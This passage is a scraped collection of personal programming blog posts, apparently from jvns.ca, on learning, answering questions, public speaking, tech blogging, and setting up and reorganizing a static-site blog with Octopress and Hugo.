and understand the resources available. \n\n Solve the underlying problem \n\n This one is a bit tricky. Sometimes people think they’ve got the right path to\na solution, and they just need one more piece of information to implement that\nsolution. But they might not be quite on the right path! For example: \n\n \n George: I’m doing X, and I got this error, how do I fix it \n Jasminda: Are you actually trying to do Y? If so, you shouldn’t do X, you should do Z instead \n George: Oh, you’re right!!! Thank you! I will do Z instead. \n \n\n Jasminda didn’t answer George’s question at all! Instead she guessed that\nGeorge didn’t actually want to be doing X, and she was right. That is helpful! \n\n It’s possible to do this in a condescending way though, like: \n\n \n George: I’m doing X, and I got this error, how do I fix it? \n Jasminda: Don’t do that, you’re trying to do Y and you should do Z to accomplish that instead. \n George: Well, I am not trying to do Y, I actually want to do X because REASONS. How do I do X? \n \n\n So don’t be condescending, and remember that the person asking may actually\nwant to do X for reasons that you don’t know about! It might be appropriate to\nanswer both the question they asked and the one you think they might need the\nanswer to instead: “Well, if you want to do X then you might try this, but if\nyou’re trying to solve problem Y with that, you might have better luck doing\nthis other thing, and here’s why that’ll work better”. \n\n Ask “Did that answer your question?” \n\n I always like to check in after I  think  I’ve answered the question and ask\n“did that answer your question? Do you have more questions?”. \n\n It’s good to pause and wait after asking this because often people need a\nminute or two to know whether or not they’ve figured out the answer. I\nespecially find this extra “did this answer your questions?” step helpful after\nwriting documentation! Often when writing documentation about something I know\nwell I’ll leave out something very important without realizing it. \n\n Offer to pair program/chat in real life \n\n I work remote, so many of my conversations at work are text-based. I think of\nthat as the default mode of communication. \n\n Today, we live in a world of easy video conferencing & screensharing! At work I\ncan at any time click a button and immediately be in a video call/screensharing\nsession with someone. Some problems are easier to talk about using your\nvoices! \n\n For example, recently someone was asking about capacity planning/autoscaling\nfor their service. I could tell there were a few things we needed to clear up\nbut I wasn’t exactly sure what they were yet. We got on a quick video call and\n5 minutes later we’d answered all their questions. \n\n I think especially if someone is really stuck on how to get started on a task,\npair programming for a few minutes can really help, and it can be a lot more\nefficient than email/instant messaging. \n\n Don’t act surprised \n\n This one’s a rule from the Recurse Center:  no feigning surprise . Here’s a\nrelatively common scenario \n\n \n Human 1: “what’s the Linux kernel?” \n Human 2: “you don’t know what the LINUX KERNEL is?!!!!?!!!???” \n \n\n Human 2’s reaction (regardless of whether they’re  actually  surprised or not)\nis not very helpful. It mostly just serves to make Human 1 feel bad that they\ndon’t know what the Linux kernel is. \n\n I’ve worked on actually pretending not to be surprised even when I actually am\na bit surprised the person doesn’t know the thing and it’s awesome. \n\n Answering questions well is awesome \n\n Obviously not all these strategies are appropriate all the time, but hopefully\nyou will find some of them helpful! I find taking the time to answer questions\nand teach people can be really rewarding. \n\n There’s an  unofficial Chinese translation of this post here . \n\n \nSpecial thanks to Josh Triplett for suggesting this post and making many helpful additions, and to Harold Treen, Vaibhav Sagar, Peter Bhat Harkins, Wesley Aptekar-Cassels, and Paul Gowder for reading/commenting.\n \n\n"},
{"url": "https://jvns.ca/blog/2022/03/13/celebrate-tiny-learning-milestones/", "title": "Celebrate tiny learning milestones", "content": "\n     \n\n Hello! Today I want to talk about – how do you know you’re getting better at programming? \n\n One obvious approach is: \n\n \n make goals \n periodically check if you achieved those goals \n if you did, celebrate \n \n\n I kind of hate goals \n\n Goals can be useful, but a lot of the time I actually find them stressful and\nnot that helpful. For example, here are a few goals I wrote down for myself 9\nyears ago: \n\n \n write a nontrivial amount of C code that works and is used by actual people \n contribute to an open source project in C \n learn C++ \n \n\n 9 years later, I have done 0 of those things. With the “goal” framing, it’s to\nthink of this as a bad thing! Like, I wanted to learn C++ and I didn’t! I still\ncan’t write C comfortably! Oh no! I guess I failed! \n\n I find this framing depressing and unhelpful. In reality, I didn’t have any real\nreason to learn C++ then and I still don’t now. So it makes sense that I\nhaven’t learned it. \n\n Instead of goals, I like to think about  tiny milestones . \n\n what’s a milestone? \n\n Usually when we talk about milestones we mean something big that only happens every few years, like “I graduated from university”. \n\n But in this post I want to talk about milestones in the sense of its etymology\n–  stones  placed every  mile  on a highway, so that you can track your\nprogress along a path. \n\n These happen much more often – maybe you used a new tool for the first time,\nor you fixed a new type of bug that you’ve never seen before, or you learned\nabout a new concept! \n\n a few of my tiny C milestones \n\n Here are a few examples of tiny milestones from the last 9 years that are\nspiritually related to my original “learn C/C++” goals. \n\n I’m pretty sure that each of these individually took less than a week, though\nall together they took many years and a lot of them would have been impossible\nfor me at the beginning. \n\n \n wrote a tiny Linux kernel module that does almost nothing \n learned about  strace \n wrote a very basic shell in C with a friend \n learned how ELF binaries are organized (symbols, sections, etc) \n learned how to use  gdb  to inspect a C program’s memory \n learned a little about how how  gdb  actually works internally (using DWARF) \n learned the difference between static and dynamic linking \n learned how to look at how a program is linked with  ldd  or  file \n (years later) debugged a problem that was caused by dynamic linking \n implemented a buffer overflow exploit using  gdb  and  strace  (for a CTF) \n got a core dump for a crashing C++ program and managed to get a stack trace out of it \n learned about the RAII pattern (though in Rust, not C++) \n learned what a few basic x86 assembly instructions mean ( mov , etc) \n pair programmed with a friend who already knew x86 assembly on implementing one Advent of Code problem (Day 1) in x86 assembly \n in general I’m comfortable writing very basic C programs as long as they\ndon’t have to do anything fancy like “memory management” \n \n\n And there were even some major milestones, like I wrote a  Ruby profiler  in Rust in 2018. \n\n When I think about it this way, I feel really good about my skills! I’ve\nlearned all kinds of stuff related to systems programming, it just happened in\na different way than I originally expected. \n\n fixing a bug can be a milestone \n\n Every time I solve a bug that I couldn’t have solved before, I think of it as a\ntiny milestone. For example, I’ve been trying to get better at CSS. One big\npart of that for me is diving deeper into CSS bugs I encounter instead of\ngiving up. \n\n Last year, I was having a problem with a flexbox. It was something that I\nvaguely felt had happened to me before but that I’d never been able to fix, and\nit made me feel like I didn’t understand how flexbox worked. \n\n But instead of just finding a workaround, I decided to try to understand what was actually happening. And I\nended up finding a blog post that explained what was happening –  Flexbox Containers, PRE tags and managing Overflow .\nAnd that was really the cause of my bug! \n\n changing goals isn’t a bad thing \n\n The reason I still haven’t learned C isn’t that I suck or that C is impossible\nto learn. It’s just that learning how to write C well was never actually\nsomething I had a real reason to do. \n\n Instead I learned Rust and Go and  strace  and  gdb  and about C structs and\nsymbols and the call stack and the heap and lots of other things. (as an aside, I loved this paper  Some were meant for C \nabout how why C is still so important) \n\n And that worked great! So I think it’s much more healthy to be flexible about\nyour goals and to celebrate the milestones you do end up getting to instead of\nfeeling bad about goals that you “failed” at. \n\n you can learn a lot by “accident” \n\n Most of my tiny milestones came up naturally because I had a project I wanted\nto do or a bug I needed to solve. So I didn’t need to explicitly plan for them,\nthey just kind of happened along the way because I kept doing projects that\nchallenged me. \n\n celebrate your tiny milestones \n\n It’s really helpful for me to  celebrate  tiny milestones like this. I celebrate\na lot by writing blog posts – I wrote the above list mostly by looking at my\nlist of old blog posts for things I’d written about related to C. \n\n If you don’t blog (it’s definitely not for everyone!), it can be helpful to write down\nthis kind of thing in your  brag document  instead. \n\n But I do think it’s important to celebrate these milestones  somewhere . It\ngives me a real sense that I’m making progress and it helps me stay motivated\nto keep learning about the thing. \n\n"},
{"url": "https://jvns.ca/blog/2014/07/25/fork-my-talks/", "title": "Open sourced talks!", "content": "\n      The wonderful  Sumana Harihareshwara \nrecently tweeted that she released her talk\n A few Python Tips  as\nCC-BY. I thought this was a super cool idea! \n\n After all, if you’ve put in a ton of work to put a talk or workshop\ntogether, it’s wonderful if other people can benefit from that as much\nas possible. And none of us have an unlimited amount of time to give\ntalks. \n\n Stephanie Sy, a developer in the Phillippines, emailed me recently to\ntell me that she used parts of my\n pandas cookbook  to run a\n workshop . IN THE\nPHILIPPINES. How cool is that? She put\n her materials online, too! . \n\n \n\n So if you want to give a talk about how to do data analysis with\nPython, you too can reuse these materials in any way you see fit! You\ncan get materials for talks I’ve given on\n this page of talks . Just attribute me, and\nmaybe tell me about it because THAT WOULD BE COOL :) \n\n In other open source talks news,\n Software Carpentry  also has\nMIT-licensed lesson materials! Want to give an novice introduction to\ngit? Go to\n the SWC bootcamp respository  and\nlook in\n novice/git !\nThey even take pull requests. \n"},
{"url": "https://jvns.ca/blog/2014/10/08/how-to-set-up-a-blog-in-5-minutes/", "title": "How to set up a blog in 5 minutes", "content": "\n      Some people at  Hacker School  were asking\nfor advice / directions for how to set up a blog. So here are some\ndirections for a simple possible way! \n\n There are lots of ways to set up a blog. This way will let you write\nposts with Markdown, version them with Git, publish them with  git\npush origin gh-pages , and, most importantly, think for exactly 0\nseconds about what your site should look like. You’ll need a working\nRuby environment which is the hardest part. I use\n rbenv  to\nmanage my Ruby. I have spent months being confused about how to make\nRuby work, so If you also need to set up Ruby it will take more than 5\nminutes and this will be a total lie. \n\n But! If you do, there is no excuse for you to not have a blog\nwithin 5 minutes (or at least not more than an hour). It took me 40\nminutes but that was because I was also writing this blog post. \n\n I used to worry a lot about what my website looked like, and then I\nrealized if I wrote interesting blog posts basically nobody cared!\n\nAll of my internal monologues about whether I should make it orange or\nnot were for nothing. (the answer to orange is always yes, though).\nLots of people subscribe with RSS anyway and never look at this site\nin the first place :) (I eventually commissioned my awesome friend\n Lea  to redesign this site and now\nI think it looks awesome). \n\n So if you have something to say, even if it is only one blog post’s\nworth of things, you can totally set up a site! Let’s start. \n\n We’ll be using \n\n \n Jekyll , a static site generator \n Octopress  to create a\nskeleton site without having to think about what it should look like \n GitHub pages to host our site \n \n\n Step 1: Install Octopress: \n\n $ gem install octopress --pre\n$ rbenv rehash\n \n\n Step 2: Create a GitHub repo \n\n You’ll need a place to put your blog! I made a new repository at\n https://github.com/jvns/fake-website .\nIf you want your blog to appear at  your-username.github.io , call\nthis repo  your-username.github.io . GitHub has some more instructions\n here \nand\n here . \n\n If you want your blog to be on a custom non-GitHub domain that you\nown, there are directions about\n how to set up a custom domain . \n\n Step 3: Create a skeleton site \n\n Now we can make a website! \n\n octopress new fake-website\ncd fake-website\njekyll serve\n \n\n This will create a new skeleton of an Octopress blog, and serve it to\nyou on  http://localhost:4000 , where you can\ntinker to your heart’s content. Not too much! Remember, you only have\n5 minutes. \n\n Step 4: Push your website to GitHub \n\n Now that we’ve maybe tinkered a bit, we’re ready for the world to see\nour (empty) website! If you put a Jekyll site in the  gh-pages  branch\nof a GitHub repository, GitHub will build it and serve it for you. \n\n From inside  fake-website , I did: \n\n git init\ngit add .\ngit commit -m\"My awesome blog\"\ngit remote add origin git@github.com:jvns/fake-website\ngit checkout -b gh-pages\ngit push -u origin gh-pages\n \n\n Step 5: Edit _config.yml \n\n When I do this, I have a website magically generated at\n http://jvns.github.io/fake-website .\nBut it looks totally broken! You need to make one more change: edit\n _config.yml  to change the base URL of your website.\n Here’s my commit to fix it .\n20 \n\n Step 6: Go blog (takes more than 5 minutes oops) \n\n At this point you have probably discovered that if anyone on the\ninternet tells you something takes 5 minutes they are definitely\nlying. But maybe you have succeeded anyway. \n\n You can create new blog posts with  octopress new post \"My Awesome Post\" . I’m excited to see what you write! \n"},
{"url": "https://jvns.ca/blog/2014/12/19/reproducing-awesomeness/", "title": "Reproducing awesomeness", "content": "\n      I had a conversation with my friend\n Tavish  once about people we respect, and\nhow to think about them, and how to be like them. (Tavish, by the way,\ngave a SUPER INTERESTING talk at PyCon this year about  what programmers can learn from software engineering research, and about how measuring what makes good software instead of just getting into flamewars ). \n\n But about AMAZING PEOPLE. There are all kinds of people who I think are\namazing. And Tavish suggested instead of being all “wow that person is\nso great they must be a genius and a wizard”, it’s better to ask “okay,\nwhat specifically do I admire about that person? Is that a way I want to\nbe? How did they get like that? Can I do that too?” \n\n And sometimes I can’t be like them, or I don’t want to! Like I might\nthink that Terence Tao is an amazing mathematician, but it turns out I\ndon’t actually want to be a mathematician. But I also like that he\n writes about his work  in a public way,\nand that tries to  demystify math research .\nAnd demystifying and writing about things I find interesting in public\nare things I can do without trying to win the Fields medal :) \n\n Or my friend  Sumana  is delightful in\nmany ways, and one of the many things I like about her is that she’s\nvery good at giving thoughtful compliments and criticism. And I’m\nlearning that looking at someone’s work carefully and telling them what\nI think is good about it and what could be improved can be a incredibly\nhelpful thing to do. So I’m trying to do more of that! And she’s also a\nbetter writer than I am, and she’s been writing a blog for 14 years, and\nprobably if I write more I will also be a better writer than I am now. \n\n So I feel these days like saying WOW THAT PERSON IS SO GREAT I COULD NOT\nPOSSIBLY is kind of… being unfair. Because I could probably be a\nlittle more like them if I think it’s important! And it’s kind of\nawkward for people to be idolized like that, and it’s better (for\nmyself, and for the not-idolized-person), to just figure out what parts\nof them I’d like to be more like, and try some things out, and see what\nworks. \n\n And perhaps tell them sometimes that I think they are doing a Very Good\nJob of doing what makes them awesome. \n\n ( edit : There was a pretty huge omission in the original version of\nthis post, which has been bothering me. There’s a lot of privilege\ninvolved in saying “hey that awesome thing? I can just go ahead and do\nthat!“. I have this huge abundance of support and free time and money\nand amazing people who are happy to help me, and it makes it so much\neasier to do things that I think are interesting or important.) \n\n"},
{"url": "https://jvns.ca/blog/2014/01/12/public-speaking/", "title": "You should give talks. They will be awesome. Here's why!", "content": "\n      I’m working on preparing a talk for  CUSEC ,\nand I wanted to write down a few things on what I think about when I\nsubmit and prepare talks. \n\n I’m pretty new to all of this, but in 2013 I gave talks at PyCon\nCanada and PyData NYC, as well as local user group meetups like\nMontreal Python. And a bunch of short presentations at Hacker School.\nI’m a lot less scared of it than I used to be! It turns out it’s kind\nof fun! \n\n The first order of business when preparing a talk is to convince\nyourself that public speaking is a good idea and better than hiding\nunder the bed.\n \n\n One blog post that really motivated me when I was starting out was\nthis post by Hilary Mason on\n why introverts should do public speaking .\nShe argues that if you’re an introvert, public speaking is an\n excellent  idea because introducing yourself is a lot of work. If you\ngive a talk, you only have to introduce yourself to everyone once. \n\n So far I’ve found that giving talks improves my experience of a\nconference a lot. It makes it easier to start conversations! People\nwill come up to me afterwards and we’ll have a natural thing to talk\nabout. Also I get a speaker badge which is fun, and sometimes you get\nin for free. \n\n Another post I find useful when motivating myself is this one by Jen\nDzuira on how\n mediocrity is inspiring .\nI often worry that my talks won’t be as well-put-together and\ninspiring as the best talks I’ve ever seen. And they probably won’t\nbe! \n\n So I instead try to think about all the talks I’ve seen that I found\nboring, or that went over time, or that were badly organized, and\nremember that I can definitely do better :). And that I have given\ntalks before and people have said nice things to me! Nobody has\never said anything mean, which I take to mean that I am amazing and\ncan do no wrong. \n\n Once I’ve convinced myself that public speaking is a good idea and\nthat I can do a decent job of it, preparing talks is still hard! I\nreally really really really like this post\n “Presentation Skills Considered Harmful” \nfrom the Serious Pony blog. \n\n You should really just go read it, but she basically points out that\npeople don’t care about you, they care about themselves. So it doesn’t\nmatter if you’re a “good speaker” and have awesome slides and socks\nthat match and perfect diction. All that matters is that you get\nacross information that makes the people you’re talking to more\nawesome. \n\n Things like awesome slides and perfect diction sometimes help you\nconvey information better, but not necessarily! They might get in the\nway! \n\n This is also a great way to think about conference proposals. I try to\nexplain not “why is this a good talk?”, but “if you come to this talk,\nhow will it make you better?” \n\n That is all! I think you should go read those blog posts and adjust\nyour beliefs as follows: \n\n \n You should give talks! \n Lots of people have given kinda crappy talks. Yours can be better! \n If you give people something they can use, everybody will love you! \n \n"},
{"url": "https://jvns.ca/blog/2016/10/09/switching-to-hugo/", "title": "Switching to Hugo", "content": "\n     \n\n I just switched this blog from Jekyll to  Hugo ! This is a very small thing but maybe you\nwill find it interesting if you find microoptimizing the way you generate your website\ninteresting (like I do, apparently). \n\n problem: Jekyll generated my site slowly. It took, like, 10 seconds! Who has time to wait\nfor that! Seriously. My friends keep telling me that Hugo is really cool and it’s in Go\nand it will make my site generate in 0 seconds. So I decided to give it an hour and see\nhow far I’d get. I got like 80% there in an hour, and it only took 4 more hours to finish\nthe remaining 20%. Not too bad! \n\n Also I got to delete a bunch of cruft in my website that I didn’t understand. Now I never\nneed to learn to understand it! \n\n My overall review of Hugo: Jekyll was fine. Hugo is also fine. I only ran into one weird\nbug when working with it today which is pretty good. Hugo is faster, which I like, and it\nmeans I don’t need to have a working Ruby dev environment. I couldn’t edit my site once\nfor six months because I was too frustrated to get Ruby to work again. So maybe Hugo is a\nlittle more fine than Jekyll (which I pretty happily used for 4 years). \n\n julia’s plan for migrating to Hugo \n\n There is a guide on the Hugo website  explaining how to migrate . I did not use this plan. The plan involves migrating Jekyll plugins to Hugo plugins, and who even knows how their Jekyll plugins work? Not me! \n\n step 1 : run  hugo import jekyll \n\n This gave me a Hugo site with all my content in it, but no theme. Not bad! \n\n step 2 : import a random minimal theme \n\n ok, now I can look at my blog posts! They have all the right words in them and are not obviously completely broken. Cool. \n\n step 3 : put my theme back \n\n I was terrified of this step. I am awful at HTML and CSS and I do not know how\nmy Jekyll theme works. So instead of trying to reproduce my theme, instead I went to\n http://jvns.ca , and literally just copied the HTML there into Hugo theme files. Once my\nsite looked right (20 minutes later!) I then figured out what I needed to do\nto generalize it so that not every page had the same title. \n\n Working backwards from the HTML that Jekyll had generated to come up with a new working\ntheme was way faster than trying to understand what my Jekyll theme files were doing. \n\n step 4 : fix everything else that was broken \n\n this included: \n\n \n no RSS feed (along the way I found out that the amazing\n Andreas  had posted a workaround for MY\nEXACT RSS PROBLEM AT  https://github.com/spf13/hugo/issues/1740 . \n all my category pages were broken \n I needed to rebuild my index page from scratch \n \n\n none of this stuff was actually that hard. Yay! Hugo seems pretty heavily influenced by\nJekyll so the porting was easy. \n\n the hard parts of static site generation \n\n from hardest to easiest: \n\n \n writing posts \n writing HTML/CSS so that they don’t look terrible (I paid my amazing friend  Lea  to design my site for me. I do not know how to do this at all). But it gets an easier rating because it only had to happen once. \n getting my static site generator to work \n \n\n success \n\n now my site gets generated by Hugo in 0.4 seconds and I understand better how it’s put\ntogether from scratch. And now I don’t rely on a mystery Jekyll category plugin that I\nnever understood in the first place. Yay! Some of my CSS is slightly more broken but I’m\nsure I’ll be able to figure out how to fix it. \n\n You can see the source for this website  on github  if\nyou want. \n\n There’s also a  Rakefile  I use to\ngenerate it. It is pretty small. The most interesting thing is a  new_post  task which\ncreates a new post file for me. I stole it from Octopress and modified it pretty heavily\nto do the Right Thing for me. \n\n 2023 update: still fine \n\n 7 years later, I’m still using Hugo and it’s still fine. I’m still using Hugo 0.40 (released in 2018) because I don’t feel\nlike upgrading. I really appreciate that Hugo is a static binary so that I can just keep using an old version forever if I want. \n\n https://wizardzines.com  uses Hugo too and that also works fine. \n\n"},
{"url": "https://jvns.ca/blog/2016/05/22/how-do-you-write-blog-posts/", "title": "\"advice\" for aspiring tech bloggers", "content": "\n     \n\n Someone wrote me an email today asking me for advice for tech bloggers. I don’t\ngive advice, but then they went on to ask me a bunch of specific questions. So here are some answers to those questions! And a couple more that they didn’t ask. \n\n What were you hoping to get out of your writing, and did it work? \n\n I think different people have different motivations for blogging. These are mine! \n\n When I started at the Recurse Center, I jokingly referred to blogging as my “media strategy” to help me find a cool job afterwards. This was a joke but also… not totally a joke! I really did want to find a more interesting job than the one I’d had before, and writing a blog seemed like a reasonable way to make progress on that. A lot of the people who interviewed me mentioned my blog as a reason they’d heard of me, so I guess this worked. I have a way better job now than I did before. \n\n Now that I’m gainfully employed, I mostly blog to \n\n \n learn new things! Firstly, writing things down helps me clarify the ideas for myself. But also sometimes I’ll write about  java garbage collection  and then people will reply to it with an  avalanche of links  and extra information \n tell people things that I wish I knew a year ago! \n very occasionally talk about my opinions and try to make the tech world slightly more like the place I would like it to be (like  asking questions is a superpower ) \n meet interesting people \n \n\n These are all more or less successful, and I learn enough things directly because I blog that it’s totally worth it. I also have gotten to meet a lot of great people because of writing this blog. WIN. \n\n How did you start writing? \n\n I started by writing every day at when at the  Recurse Center . I spent maybe.. 2 hours writing per day? And I wrote a lot of things that are not super interesting to future-julia like  this one  and  this one . \n\n I think writing every day was a good discipline and the sheer volume helped me write some interesting things. Now I write less often: once every week or two. \n\n I used to really wonder how  Cathy O’Neil  consistently wrote so many interesting posts but now I think it’s because she thinks about the stuff she’s interested in a lot and then regularly writes down whatever she’s thinking about right now. \n\n How long does it take you to write a post? \n\n 1-3 hours probably. I sit down and write something and don’t stop until I’ve published it. I know other people who edit their work and write more Serious Long Form Things that they try to really polish and it’s awesome. I rarely do that. \n\n I really like writing short blog posts because I have a short attention span and I find short blog posts easier to digest when other people write them. And they’re less of an investment! Half of my blog posts are less than 500 words, and, looking at them, I’ve gotten a ton of positive comments on a lot of those under-500-words posts. And sometimes I write a thing and nobody really seems to like it and that is also okay. \n\n There’s a great talk called  How I Won The Lottery  by Darius Kazemi about creative work and how producing things that you think are good is like buying a lottery ticket. So I guess I try to make good things and buy many small lottery tickets. \n\n Also some things take me more write, though. I spent extra time on  Things you should know about stock options before negotiating an offer  and  How to trick a neural network into thinking a panda is a vulture  took a bunch of extra research. \n\n How do you decide what’s worth writing about? \n\n \n “would this have helped me a year ago?” \n “would this have helped me last week?” \n “do i think this would be interesting to at least like 2 other people?” \n \n\n Sometimes I’ll ask one friend and if they think the idea is interesting, then, I’m good to go! \n\n I know lots of people who are AMAZING and have AMAZING THINGS TO SAY and I often need to harangue them for a while before they remember that not everybody already knows those amazing things (“oh, people are interested in that??? I never would have thought!”). Sometimes I’m even successful! \n\n Basically I have a pretty low bar for interestingness and it mostly works out fine. \n\n How do you find the balance between getting things done and writing about your work? \n\n When I do side projects, I’m often a lot less motivated to do them if I  don’t \nwrite about them – if I do the project on my own, then I learn from it, but if\nI do it and write about it then EVERYONE can learn from it!!! \n\n Is it scary to admit things that you don’t know? \n\n In practically every post I write, I say “I don’t know $thing!”. This is different from other blogs where the authors talk about things they know about or are experts on. \n\n On one hand, saying that I don’t know things this means people are less likely to think I am a magical wizard who knows everything. On the other hand, nobody ever thought I was a magical wizard who knows everything in the first place. \n\n I used to never want to write about machine learning because it was my JOB and I’m supposed to know EVERYTHING about my job and what if I write about machine learning and people discover that I don’t know everything about the field. \n\n Mostly I found this fear got in the way of me learning things and getting better at my job. Telling people what I don’t know means that they can help me learn it sooner! \n\n On the balance I think I’d happy be known for being curious and knowledgeable and a good source of information & questions and that I don’t need to be a magical wizard oracle. It’s still sorta scary sometimes, but it’s the bet I’ve made and so I’m sticking with it for now :) \n\n Are people jerks on the internet? \n\n Nobody asked me this but I will answer it anyway. I hear a lot from people that they’re worried about blogging because they think that the internet will just be mean to them. \n\n I maintain a pretty aggressively positive tone in my blogging. This is partly because it’s genuinely how I view a lot of things, but it’s also partly a defensive tactic. Getting negative comments is stressful and if I’m super positive all the time (which is pretty easy!) then I think it attracts less internet jerks. Mostly people are not jerks to me. \n\n BUT. This is mostly to say – please don’t be unnecessarily mean about people’s work on the internet! My friend wrote an awesome post the other day and then people made all these jerk comments and it sucked. I <3 criticism (“hey that thing you said is incorrect in an  important way !“) and </3 people being jerks (“lol are u dumb that is not how the kernel works”). \n\n ❤ blogging \n\n Writing this blog has been super helpful for me professionally and I really like it. It takes a lot of time (apparently I’ve written 200 blog posts now???), but the cool thing is that once I’ve written those 200 blog posts they’re there forever! People can just keep reading them and maybe learning interesting things! \n\n I also think it’s extremely fun and interesting when regular people (not Programming Wizards) just write about their regular work and what they’re learning right now or what they wish they’d known in the past. \n\n  thanks to Kamal Marhubi for reading this!  \n\n"},
{"url": "https://jvns.ca/blog/2019/02/17/organizing-this-blog-into-categories/", "title": "Organizing this blog into categories", "content": "\n     \n\n Today I organized the front page of this blog ( jvns.ca ) into CATEGORIES! Now it\nis actually possible to make some sense of what is on here!! There are 28 categories (computer networking!\nlearning! “how things work”! career stuff! many more!) I am so excited about this. \n\n How it works: Every post is in only 1 category. Obviously the categories aren’t “perfect” (there is\na “how things work” category and a “kubernetes” category and a “networking” category, and so for a\n“how container networking works in kubernetes” I need to just pick one) but I think it’s really nice\nand I’m hoping that it’ll make the blog easier for folks to navigate. \n\n If you’re interested in more of the story of how I’m thinking about this: I’ve been a little\ndissatisfied for a long time with how this blog is organized. Here’s where I started, in 2013, with a\npretty classic blog layout (this is Octopress, which was a Jekyll Wordpress-lookalike theme that was\ncool back then and which served me very well for a long time): \n\n \n\n problem with “show the 5 most recent posts”: you don’t know what the person’s writing is about! \n\n This is a super common way to organize a blog: on the homepage of your blog, you display maybe the 5\nmost recent posts, and then maybe have a “previous” link. \n\n The thing I find tricky about this (as a blog reader) is that \n\n \n it’s hard to hunt through their back catalog to find cool things they’ve written \n it’s SO HARD to get an overall sense for the body of a person’s work by reading 1 blog post at a\ntime \n \n\n next attempt: show every post in chronological order \n\n My next attempt at blog organization was to show every post on the homepage in chronological order.\nThis was inspired by  Dan Luu’s blog , which takes a super minimal approach.\nI switched to this (according to the internet archive) sometime in early 2016. Here’s what it looked\nlike (with some CSS issues :)) \n\n \n\n The reason I like this “show every post in chronological order” approach more is that when I discover a\nnew blog, I like to obsessively binge read through the whole thing to see all the cool stuff the person\nhas written.  Rachel by the bay  also organizes her writing this way,\nand when I found her blog I was like OMG WOW THIS IS AMAZING I MUST READ ALL OF THIS NOW and being\nable to look through all the entries quickly and start reading ones that caught my eye was SO FUN. \n\n Will Larson’s blog  also has a “list of all posts” page which I\nfind useful because it’s a good blog, and sometimes I want to refer back to something he wrote\nmonths ago and can’t remember what it was called, and being able to scan through all the titles\nmakes it easier to do that. \n\n I was pretty happy with this and that’s how it’s been for the last 3 years. \n\n problem: a chronological list of 390 posts still kind of sucks \n\n As of today, I have 390 posts here (360,000 words! that’s, like, 4 300-page books! eep!). This is\nobjectively a lot of writing and I would like people new to the blog to be able to navigate it and\nactually have some idea what’s going on. \n\n And this blog is not actually just a totally disorganized group of words! I have a lot of specific\ninterests: I’ve written probably 30 posts about computer networking, 15ish on ML/statistics, 20ish\ncareer posts, etc. And when I write a new Kubernetes post or whatever, it’s usually at least sort of\nrelated to some ongoing train of thought I have about Kubernetes. And it’s totally obvious to  me \nwhat other posts that post is related to, but obviously to a new person it’s not at all clear what\nthe trains of thought are in this blog. \n\n solution for now: assign every post 1 (just 1) category \n\n My new plan is to assign every post a single category. I got this idea from  Itamar Turner-Trauring’s site . \n\n Here are the initial categories: \n\n \n Cool computer tools / features / ideas \n Computer networking \n How a computer thing works \n Kubernetes / containers \n Zines / comics \n On writing comics / zines \n Conferences \n Organizing conferences \n Businesses / marketing \n Statistics / machine learning / data analysis \n Year in review \n Infrastructure / operations engineering \n Career / work \n Working with others / communication \n Remote work \n Talks transcripts / podcasts \n On blogging / speaking \n On learning \n Rust \n Linux debugging / tracing tools \n Debugging stories \n Fan posts about awesome work by other people \n Inclusion \n rbspy \n Performance \n Open source \n Linux systems stuff \n Recurse Center (my daily posts during my RC batch) \n \n\n I guess you can tell this is a systems-y blog because there are 8 different systems-y categories\n(kubernetes, infrastructure, linux debugging tools, rust, debugging stories, performance, and linux\nsystems stuff, how a computer thing works) :). \n\n But it was nice to see that I also have this huge career / work category! And that category is\npretty meaningful to me, it includes a lot of things that I struggled with and were hard for me to\nlearn. And I get to put all my machine learning posts together, which is an area I worked in for 3\nyears and am still super interested in and every so often learn a new thing about! \n\n How I assign the categories: a big text file \n\n I came up with a scheme for assigning the categories that I thought was really fun! I knew\nimmediately that coming up with categories in advance would be impossible (how was I supposed to\nknow that “fan posts about awesome work by other people” was a substantial category?) \n\n So instead, I took kind of a Marie Kondo approach: I wrote a script to just dump all the titles of\nevery blog post into a text file, and then I just used vim to organize them roughly into similar\nsections. Seeing everything in one place (a la marie kondo) really helped me see the patterns and\nfigure out what some categories were. \n\n Here’s the final result of that text file .\nI think having a lightweight way of organizing the posts all in one file made a huge difference and\nthat it would have been impossible for me to seen the patterns otherwise. \n\n How I implemented it: a hugo taxonomy \n\n Once I had that big text file, I wrote  a janky python script  to assign the categories in that text file to the actual posts. \n\n I use Hugo for this blog, and so I also needed to tell Hugo about the categories. This blog already technically\nhas tags (though they’re woefully underused, I didn’t want to delete them). I use Hugo, and it turns\nout that in Hugo you can define arbitrary taxonomies. So I defined a new taxonomy for these sections\n(right now it’s called, unimaginatively,  juliasections ). \n\n The details of how I did this are pretty boring but  here’s the hugo template that makes it display on the homepage . I used this  Hugo documentation page on taxonomies a lot . \n\n organizing my site is cool! reverse chronology maybe isn’t the best possible thing! \n\n Amy Hoy has this interesting article called  how the blog broke the\nweb  about how the rise of blog software\nmade people adopt a site format that maybe didn’t serve what they were writing the best. \n\n I don’t personally feel that mad about the blog / reverse chronology organization: I like blogging!\nI think it was nice for the first 6 years or whatever to be able to just write things that I think\nare cool without thinking about where they “fit”. It’s worked really well for me. \n\n But today, 360,000 words in, I think it makes sense to add a little more structure :). \n\n what it looks like now! \n\n Here’s what the new front page organization looks like! These are the blogging / learning / rust\nsections! I think it’s cool how you can see the evolution of some of my thinking (I sure have\nwritten a lot of posts about asking questions :)). \n\n \n\n I ❤ the personal website \n\n This is also part of why I love having a personal website that I can organize any way I want: for\nboth of my main sites ( jvns.ca  and now\n wizardzines.com ) I have total control over how they appear! And I can\nevolve them over time at my own pace if I decide something a little different will work better for\nme. I’ve gone from a jekyll blog to octopress to a custom-designed octopress blog to Hugo and made a\nton of little changes over time. It’s so nice. \n\n I think it’s fun that these 3 screenshots are each 3 years apart – what I wanted in 2013 is\nnot the same as 2016 is not the same as 2019! This is okay! \n\n And I really love seeing how other people choose to organize their personal sites! Please keep\nmaking cool different personal sites. \n\n"},
